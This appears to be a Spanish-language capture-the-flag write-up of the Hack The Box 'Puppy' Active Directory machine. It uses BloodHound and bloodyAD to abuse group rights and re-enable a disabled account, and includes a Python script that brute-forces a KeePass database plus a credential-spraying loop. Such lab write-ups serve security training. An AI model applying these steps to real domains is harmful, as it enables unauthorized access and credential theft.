#ActiveDirectory #windows #medium 

### Machine Information

As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!
### Ping
```python
ping -c 1 10.10.11.70
PING 10.10.11.70 (10.10.11.70) 56(84) bytes of data.
64 bytes from 10.10.11.70: icmp_seq=1 ttl=127 time=74.4 ms

--- 10.10.11.70 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 74.406/74.406/74.406/0.000 ms
```

### TTL 127 = Windows

### nmap
```python
sudo nmap -p- -open -sCV -sS -Pn -n 10.10.11.70
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 13:08 EDT
Stats: 0:04:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 68.18% done; ETC: 13:13 (0:00:26 remaining)
Nmap scan report for 10.10.11.70
Host is up (0.076s latency).
Not shown: 65513 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-07 00:11:57Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
51509/tcp open  msrpc         Microsoft Windows RPC
51549/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-07T00:13:53
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 367.88 seconds
```

### Información del dominio 

- Domain Name: PUPPY.HTB
- Host: DC

Además de los puertos y servicios comunes en un Active Directory, vemos 2 puertos para compartir archivos : SMB (puerto 445) : el servicio estándar para compartir archivos de Windows. NFS (puerto 2049) este servicio es poco común en los hosts de Windows, la presencia de NFS indica un subsistema UNIX o una configuración híbrida. por ejemplo, WSL2(windows subsystem for linux) o Docker para Windows con volúmenes compartidos. O una configuración errónea donde las configuraciones de origen Linux fueron portadas de manera insegura.

### nxc

Utilice el modulo de spider_plusmodo con netexec para enumerar todos los archivos legibles del SMB con las credenciales que se nos proporcionan inicialmente para el usuario del dominio levi.james
  
```python
nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' -M spider_plus
```

![[Pasted image 20250606133200.png]]


- NETLOGON y SYSVOL, comúnmente utilizados en Active Directory para la entrega de scripts y la configuración de políticas, eran ambos legibles, pero en este caso no eran útiles.

- DEV es un recurso compartido personalizado. Sin embargo, no mostró permiso de lectura para el usuario "levi.james" en el contexto actual.

### smbclient

```python
smbclient //puppy.htb/DEV -U 'PUPPY.HTB\\levi.james'
```

![[Pasted image 20250606133725.png]]

### Bloodhound-python

```python
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d 'puppy.htb' -ns 10.10.11.70 --zip -c All -dc 'dc.puppy.htb'
```

![[Pasted image 20250606143647.png]]

Una vez generado el ZIP, tenemos que cargarlo en BloodHound. en este caso estoy usando el bloodhound-comunity para el análisis gráfico. Desde el principio el resultado expone una ruta clara Object Control definida: levi.jameses un miembro del HR@PUPPY.HTB  que tiene los derechos de GenericWrite sobre el DEVELOPERS@PUPPY.HTB. Si bien BloodHound revela un monton de vectores de ataque convincentes, desentrañaremos esos hilos a medida que se vuelvan tácticamente relevantes.

![[Pasted image 20250606144605.png]]

### SMB Access

Hemos identificado que el acceso al recurso compartido DEV está restringido solo para los miembros de PUPPY-DEVSgrupo. Aunque levi.jamesno está en la lista de invitados, cuenta con los privilegios de GenericWrite sobre el DEVELOPERSgrupo. Para confirmar la lista actual de usuarios pertenecientes a este grupo, vamos a realizar una enumeración con bloodyAD

```python
bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' get object 'DEVELOPERS'
```

![[Pasted image 20250606145919.png]]

efectivamente levi.james. no esta dentro de los usuarios pertenecientes a este grupo pero con el permiso de GenericWritela podemos agregarlo a la lista de invitados nosotros mismos.

```python
❯ bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'
```

![[Pasted image 20250606150659.png]]

### smbclient

ahora tenemos acceso al recurso compartido DEV. descargamos los 2 archivos

![[Pasted image 20250606151433.png]]

### Python environment

para poder leer el archivo de keepass necesitamos usar la utilidad pykeepass ya que esta es la que tiene soporte sobre las versionas mas actualizadas de keepass. para ello voy a crear un entorno virtual con python para instalar pykeepass de manera aislada. 

```python
sudo apt install python3-venv  # solo si no tienes venv

python3 -m venv venv

source venv/bin/activate

pip install pykeepass

```

Opción2
```python
sudo apt install pipx

pipx install pykeepass
```


![[Pasted image 20250606152303.png]]

he creado este script para poder obtener las credenciales haciendo uso de la utilidad pykeepass

```python
#!/usr/bin/env python3

from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError
import sys
import os

# Verificar que se hayan pasado 2 argumentos: .kdbx y wordlist
if len(sys.argv) != 3:
	print(f"Uso: python3 {os.path.basename(__file__)} <archivo.kdbx> <archivo_wordlist>")
	sys.exit(1)

# Obtener archivos desde los argumentos
KDBX_FILE = sys.argv[1]
WORDLIST = sys.argv[2]

try:
	with open(WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
		for line in f:
password = line.strip()
			try:
				kp = PyKeePass(KDBX_FILE, password=password)
				print(f'\n[+] ¡Éxito! Contraseña encontrada: {password}')
				print('[+] Volcando entradas:\n')
				for entry in kp.entries:
					print(f' - {entry.title}: {entry.username} / {entry.password}')
				break
			except CredentialsError:
			continue
except FileNotFoundError:
	print(f'[!] Archivo no encontrado: {WORDLIST}')
sys.exit(1)
```

```python
python3 keepassBruteForze.py recovery.kdbx /usr/share/wordlists/rockyou.txt
```

obtenemos una lista de usuarios y contraseñas que podemos usar para hacer validaciones 

![[Pasted image 20250606153905.png]]

normalmente la nomenclatura de las credenciales se hace de la siguiente forma nombre.apellido 
![[Pasted image 20250606165120.png]]


### Validación

```python
❯ while IFS=: read -r user pass; do echo "[*] Testing $user:$pass"; nxc smb puppy.htb -u "$user" -p "$pass"; done < creds.txt
```

de esta manera podemos validar nuestra lista de usuarios realizando una especie de fuerza bruta. pero ninguno es valido

![[Pasted image 20250606165322.png]]

### Bloodhound

regresamos al grafico y podemos identificar que el grupo DEVELOPERS@PUPPY.HTB tiene 3 miembros

![[Pasted image 20250606165729.png]]

el miembro del grupo que mas resalta es adam.silver ya que este pertenece al grupo de "REMOTE MANAGEMENT USERS" pero tenemos un problema. esta cuenta esta desabilitada

![[Pasted image 20250606170143.png]]

después de Investigar más a fondo, descubrimos que ant.edwards pertenece a un grupo privilegiado llamado SENIOR DEVS

![[Pasted image 20250606170248.png]]

y a su vez el grupo SENIOR DEVS tiene permisos de GenericALL sobre adam.silver

![[Pasted image 20250606170451.png]]

### Resolución

SENIOR DEVS tiene permisos de GenericAll sobre adam.silver. Esto significa que ant.edwards puede controlar completamente a adam.silver, incluyendo reactivar la cuenta, restablecer la contraseña

### ## Privesc

Por lo tanto, nuestro camino de explotación comienza con las credenciales de trabajo ant.edwards / Antman2025!, asi que vamos a hacer una validación rápida con nxc

![[Pasted image 20250606171112.png]]

efectivamente la cuenta de adam.silver esta desactivada para el grupo "REMOTE MANAGEMENT USERS"

```python
bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' get object 'adam.silver'
```

![[Pasted image 20250606171445.png]]

El atributo `userAccountControl` es una máscara de bits que define las propiedades del usuario. 

`512 → ( CUENTA_NORMAL ) 514 → ( DESACTIVAR_CUENTA )`

Para reactivar la cuenta, simplemente debemos reescribir esa bandera: Establecer `userAccountControl` → `512` para eliminar el estado deshabilitado. 

#Nota: usar la herramienta de bloodyAD.py desde el repositorio  [bloodyAD.py](https://github.com/CravateRouge/bloodyAD?tab=readme-ov-file) 

```python
./bloodyAD.py --host 10.10.11.70 -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set object 'adam.silver' 'userAccountControl' -v 512
```

```python
bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' get object 'adam.silver'

# verificamos los cambios
```

![[Pasted image 20250606183001.png]]

realizamos los diferentes comandos y podemos actualizar el estado de la cuenta. luego setear una nueva contraseña y luego entramos al sistema

![[Pasted image 20250606183913.png]]

encontramos un archivo y lo descargamos para analizarlo

![[Pasted image 20250606185648.png]]

obtenemos unas credenciales nuevas asi que vamos a validarlas

![[Pasted image 20250606185849.png]]

tenemos conexión vía wim-rm

![[Pasted image 20250606190138.png]]

